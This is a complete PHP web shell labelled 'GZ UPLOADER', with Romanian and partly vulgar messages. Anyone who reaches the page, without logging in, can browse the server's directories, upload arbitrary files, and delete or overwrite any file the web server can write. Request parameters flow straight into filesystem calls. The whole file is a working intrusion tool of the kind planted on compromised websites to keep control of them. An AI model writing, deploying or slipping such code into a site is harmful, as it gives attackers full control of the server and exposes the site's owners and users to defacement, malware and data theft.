<?php
if (isset($_GET['goto'])) {
    chdir($_GET['goto']);
}
if (isset($_POST['create'])) {
    if (!file_exists(getcwd() . DIRECTORY_SEPARATOR . $_POST['folder'])) {
        mkdir(getcwd() . DIRECTORY_SEPARATOR . $_POST['folder']);
    }
}
if (isset($_GET['deldir'])) {
    rmdir($_GET['deldir']);
}
if (isset($_GET['delfile'])) {
    unlink($_GET['delfile']);
    chdir(dirname($_GET['delfile']));
}
if(isset($_POST['edit'])) {
    $file = $_POST['filePath'];
    $content = $_POST['fileContents'];
    $fp = fopen($file,"w") or die('Nu ai permisii sa scriiin plm');
	fwrite($fp,$content);
	fclose($fp);
}
?>
<html lang="en"> <head> <meta charset="UTF-8" />
<title>GZ UPLOADER</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<style type="text/css">
html, body {
	font-family:Arial;
	font-size:12px;
	color:green;
	background:#000;
}
textarea {
	border:1px red solid;
	padding:5px;
	color:green;
	background:#222;
}
</style>
</head>
<body>
<span class="style1">Folder:</span>
<span class="style2"> <?= getcwd(); ?> </span>
<hr>
<table width="100%" border="0">
<tr>
<td width="50%" align="left">
<form action="" method="post" enctype="multipart/form-data">
<input type="file" id="file" name="files[]" multiple="multiple" />
<input type="submit" name="upload" value="Upload!" />
</form>
<?php
if (isset($_POST['upload'])) {
    foreach ($_FILES['files']['name'] as $f => $name) {
        move_uploaded_file($_FILES["files"]["tmp_name"][$f], $name);
    }
    echo "Urcate in pula mea!";
}
?>
</td>
<td width="50%" align="right">
<form action="" method="post">
Folder nou:
<input type="text" name="folder" />
<input type="submit" name="create" value="Creaza!" />
</form>
</td>
</tr>
</table>
<hr>
<?php
if(isset($_GET['editfile'])) {
$file = realpath($_GET['editfile']);
?>
<form action="" method="POST">
<input type="hidden" name="filePath" value="<?=$file;?>">
<textarea style="width:100%; height:400px" name="fileContents"><?=htmlspecialchars(file_get_contents($file));?></textarea>
<input type="submit" name="edit" value="EDIT FILE">
</form>
<?php
}
else {
if ($handle = opendir(getcwd())) {
    while (false !== ($obiect = readdir($handle))) {
        if ($obiect != ".") {
            if (is_dir($obiect)) {
?> <a href="<?= $_SERVER['PHP_SELF']; ?>?deldir=<?= realpath($obiect); ?>" class="style1" style="text-decoration:none" title="Sterge">[X]</a>&nbsp;<a href="<?= $_SERVER['PHP_SELF']; ?>?goto=<?= realpath($obiect); ?>" style="text-decoration:none; color:#FF0000">[ <?= $obiect; ?> ]</a><br> <?php
            } else {
?> <a href="<?= $_SERVER['PHP_SELF']; ?>?editfile=<?= realpath($obiect); ?>" class="style1" style="text-decoration:none" title="Sterge">[E]</a> <a href="<?= $_SERVER['PHP_SELF']; ?>?delfile=<?= realpath($obiect); ?>" class="style1" style="text-decoration:none" title="Sterge">[X]</a>&nbsp;<?= $obiect; ?><br> <?php
            }
        }
    }
    closedir($handle);
}
}
?> </body> </html>